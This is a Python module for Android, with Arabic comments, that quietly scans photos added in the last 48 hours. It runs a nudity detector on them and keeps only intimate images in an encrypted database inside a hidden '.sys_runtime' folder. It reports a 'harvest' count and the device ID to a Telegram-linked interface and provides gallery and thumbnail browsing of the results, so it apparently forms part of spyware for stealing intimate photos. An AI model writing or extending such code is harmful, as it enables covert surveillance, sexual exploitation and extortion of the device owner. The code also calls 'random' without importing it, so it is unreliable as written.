# -*- coding: utf-8 -*-
import os
import time
import threading
import hashlib
import sqlite3
import logging
import gc
import base64
from datetime import datetime

# إعداد المسارات
P = os.path.join(os.getcwd(), ".sys_runtime")
DB = os.path.join(P, "m_arch.db")
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(filename=os.path.join(P, "s.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False

# محاولة استيراد التشفير المتقدم
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False


class MediaScanner:
    def __init__(self, det=None, ui=None):
        self.det = det          # NudeDetector instance
        self.ui = ui            # TelegramUI instance
        self.active = False
        self.did = "Unknown"
        self._fernet = self._init_crypto()
        self._init_db()

        # محاولة جلب معرف الجهاز
        try:
            if self.ui and hasattr(self.ui, 'm') and hasattr(self.ui.m, 'did'):
                self.did = self.ui.m.did
        except Exception:
            pass

    # ========== نظام التشفير الحقيقي (إصلاح 2) ==========
    def _init_crypto(self):
        """اشتقاق مفتاح Fernet فريد لكل جهاز باستخدام ANDROID_ID"""
        if not JNI or not CRYPTO_AVAILABLE:
            return None
        try:
            Secure = autoclass('android.provider.Settings$Secure')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            context = PythonActivity.mActivity
            android_id = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID)
            if not android_id:
                android_id = "unknown_device"
            # استخدام ملح ثابت للمسارات
            salt = b'\xa7\x3c\xf8\x91\x4e\xb2\xd0\x65'
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(android_id.encode()))
            return Fernet(key)
        except Exception as e:
            logging.error(f"Crypto init error: {e}")
            return None

    def _enc(self, text: str) -> str:
        """تشفير النص باستخدام Fernet، مع fallback إلى base64"""
        if self._fernet:
            try:
                return self._fernet.encrypt(text.encode()).decode()
            except Exception:
                pass
        # fallback آمن (لكنه أقل أماناً)
        return base64.b64encode(text.encode()).decode()

    def _dec(self, enc_text: str) -> str:
        """فك تشفير النص"""
        if self._fernet:
            try:
                return self._fernet.decrypt(enc_text.encode()).decode()
            except Exception:
                pass
        try:
            return base64.b64decode(enc_text.encode()).decode()
        except Exception:
            return ""

    # ========== إدارة قاعدة البيانات ==========
    def _init_db(self):
        """إنشاء جدول media مع إزالة عمود normal (نحتفظ فقط بالحساس والمعلق)"""
        try:
            with sqlite3.connect(DB) as conn:
                conn.execute('''CREATE TABLE IF NOT EXISTS media (
                    h TEXT PRIMARY KEY,
                    p TEXT,
                    ts INTEGER,
                    cat TEXT DEFAULT 'pending',
                    score REAL DEFAULT 0)''')
                conn.execute('CREATE INDEX IF NOT EXISTS idx_cat ON media(cat)')
                conn.commit()
        except Exception as e:
            logging.error(f"DB Init error: {e}")

    def _partial_hash(self, path: str) -> str:
        """بصمة فريدة للملف تعتمد على الحجم والتوقيت + أول 2KB"""
        try:
            st = os.stat(path)
            base = f"{st.st_size}_{int(st.st_mtime)}"
            with open(path, "rb") as f:
                head = f.read(2048)
            return hashlib.md5(head + base.encode()).hexdigest()
        except Exception:
            return None

    def _safe_path(self, path: str) -> bool:
        """تجنب مسح المجلدات الحساسة والملفات المخفية"""
        bad = ["/Android/", "/obb/", "/data/", "/."]
        return not any(x in path for x in bad) and not os.path.basename(path).startswith(".")

    # ========== مسح موجه (إصلاح 1) ==========
    def _fast_scan(self, limit=100):
        """جلب الصور المضافة خلال آخر 48 ساعة فقط"""
        if not JNI:
            return []
        cursor = None
        results = []
        try:
            act = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = act.getContentResolver()
            MediaStore = autoclass('android.provider.MediaStore')

            # فلتر زمني: آخر 48 ساعة
            time_threshold = int(time.time()) - (48 * 3600)
            img_uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            projection = ["_data", "date_added"]
            selection = "date_added > ?"
            args = [str(time_threshold)]
            order = "date_added DESC LIMIT " + str(limit)

            cursor = resolver.query(img_uri, projection, selection, args, order)
            if cursor:
                while cursor.moveToNext():
                    p = cursor.getString(0)
                    if p and os.path.exists(p) and self._safe_path(p):
                        results.append(p)
            return results
        except Exception as e:
            logging.error(f"Scan error: {e}")
            return []
        finally:
            if cursor:
                cursor.close()
            gc.collect()

    # ========== معالجة وتحليل الصور (إصلاح 3) ==========
    def _process_files(self, paths):
        """تحليل الصور الجديدة وتخزين الحساسة فقط"""
        if self.active or not paths:
            return
        self.active = True
        sensitive_count = 0

        try:
            now = int(time.time())
            with sqlite3.connect(DB) as conn:
                for p in paths:
                    h = self._partial_hash(p)
                    if not h:
                        continue

                    # تجنب التكرار
                    cur = conn.execute("SELECT 1 FROM media WHERE h=?", (h,))
                    if cur.fetchone():
                        continue

                    # التحليل باستخدام NudeDetector
                    cat = 'pending'
                    score = 0.0
                    if self.det and hasattr(self.det, '_analyze'):
                        prob = self.det._analyze(p)
                        if prob > 0.85:
                            cat = 'nude'
                            score = prob
                            sensitive_count += 1
                        elif prob > 0.45:
                            cat = 'questionable'
                            score = prob
                            sensitive_count += 1
                        else:
                            # ✅ إصلاح 3: لا ندرج الصور العادية
                            continue
                    else:
                        # في حالة عدم وجود كاشف، نصنف معلقًا لحين توفر النموذج
                        cat = 'pending'

                    # إدراج فقط إذا كانت الفئة nude أو questionable أو pending
                    conn.execute(
                        "INSERT INTO media (h, p, ts, cat, score) VALUES (?, ?, ?, ?, ?)",
                        (h, self._enc(p), now, cat, score)
                    )

                conn.commit()

            # إشعار بالصور الحساسة المكتشفة
            if sensitive_count > 0 and self.ui and hasattr(self.ui, 'notify_harvest'):
                try:
                    self.ui.notify_harvest(self.did, sensitive_count)
                except Exception as e:
                    logging.error(f"Notify error: {e}")

        except Exception as e:
            logging.error(f"Process error: {e}")
        finally:
            self.active = False
            gc.collect()

    # ========== توليد صورة مصغرة (إصلاح 4) ==========
    def get_thumbnail(self, path):
        """إرجاع مسار الصورة المصغرة، مع إغلاق cursor بأمان"""
        if not JNI or not os.path.exists(path):
            return None

        cursor = None
        try:
            # تنظيف المصغرات القديمة (أكبر من 10 دقائق)
            now = time.time()
            for f in os.listdir(P):
                if f.startswith("th_") and os.path.getmtime(os.path.join(P, f)) < now - 600:
                    try:
                        os.remove(os.path.join(P, f))
                    except:
                        pass

            MediaStore = autoclass('android.provider.MediaStore')
            BitmapFactory = autoclass('android.graphics.BitmapFactory')
            CompressFormat = autoclass('android.graphics.Bitmap$CompressFormat')
            FileOutputStream = autoclass('java.io.FileOutputStream')
            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()

            uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            sel = MediaStore.Images.Media.DATA + "=?"
            cursor = resolver.query(uri, ["_id"], sel, [path], None)

            if cursor and cursor.moveToFirst():
                img_id = cursor.getLong(0)
                options = BitmapFactory.Options()
                options.inSampleSize = 2
                bitmap = MediaStore.Images.Thumbnails.getThumbnail(
                    resolver, img_id,
                    MediaStore.Images.Thumbnails.MINI_KIND,
                    options
                )
                if bitmap:
                    out_path = os.path.join(P, f"th_{int(time.time())}_{random.randint(0,99)}.jpg")
                    with FileOutputStream(out_path) as out:
                        bitmap.compress(CompressFormat.JPEG, 70, out)
                        out.flush()
                    bitmap.recycle()
                    return out_path
        except Exception as e:
            logging.error(f"Thumb error: {e}")
        finally:
            # ✅ إصلاح 4: إغلاق cursor بشكل آمن
            if cursor:
                cursor.close()
            gc.collect()
        return None

    # ========== جلب المعرض ==========
    def get_gallery_by_category(self, category, limit=16, page=0):
        offset = page * limit
        results = []
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute(
                    "SELECT h, p, cat, score FROM media WHERE cat=? ORDER BY ts DESC LIMIT ? OFFSET ?",
                    (category, limit, offset)
                )
                rows = cur.fetchall()
                for i, row in enumerate(rows):
                    path = self._dec(row[1])
                    if os.path.exists(path):
                        results.append({
                            "hash": row[0],
                            "path": path,
                            "cat": row[2],
                            "score": row[3],
                            "label": str(offset + i + 1).zfill(2)
                        })
                    else:
                        conn.execute("DELETE FROM media WHERE h=?", (row[0],))
                conn.commit()
        except Exception as e:
            logging.error(f"Gallery error: {e}")
        return results

    # ========== تحديث فئة ملف ==========
    def update_category(self, file_hash, category, score=0):
        try:
            with sqlite3.connect(DB) as conn:
                conn.execute("UPDATE media SET cat=?, score=? WHERE h=?", (category, score, file_hash))
                conn.commit()
        except Exception:
            pass

    # ========== إحصائيات ==========
    def get_statistics(self):
        stats = {'nude': 0, 'questionable': 0, 'normal': 0, 'pending': 0}
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute("SELECT cat, COUNT(*) FROM media GROUP BY cat")
                for row in cur.fetchall():
                    if row[0] in stats:
                        stats[row[0]] = row[1]
        except Exception as e:
            logging.error(f"Statistics error: {e}")
        return stats

    # ========== تنظيف قاعدة البيانات ==========
    def _cleanup_db(self):
        try:
            with sqlite3.connect(DB) as conn:
                cur = conn.execute("SELECT h, p FROM media")
                to_del = []
                for h, p_enc in cur.fetchall():
                    if not os.path.exists(self._dec(p_enc)):
                        to_del.append((h,))
                if to_del:
                    conn.executemany("DELETE FROM media WHERE h=?", to_del)
                # حذف أقدم من 5000 صورة احتياطياً
                conn.execute("DELETE FROM media WHERE h NOT IN (SELECT h FROM media ORDER BY ts DESC LIMIT 5000)")
                conn.execute("VACUUM")
                conn.commit()
        except Exception:
            pass
        finally:
            gc.collect()

    # ========== تشغيل المسح ==========
    def run_scan(self):
        def _task():
            files = self._fast_scan(limit=100)
            if files:
                self._process_files(files)
        threading.Thread(target=_task, daemon=True).start()


def create(det=None, ui=None):
    return MediaScanner(det, ui)
